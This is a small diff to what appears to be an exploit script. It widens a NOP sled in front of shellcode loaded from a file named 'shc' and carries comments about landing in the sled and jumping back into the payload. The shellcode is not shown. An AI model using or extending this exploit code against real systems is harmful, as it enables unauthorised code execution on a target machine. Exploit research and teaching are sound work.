@@ -152,7 +152,7 @@ with Client(args.target, args.password, delay=args.delay) as client:
     client.press_key('enter')
 
     # ok, here's the real exploit :)
-    shellcode = b'\x90' * 0x60
+    shellcode = b'\x90' * 0xb0
     shellcode += open('shc', 'rb').read()
     # nopsled into jmp $-0x40.
     # basically a safety net if we land after the main part of the shellcode,
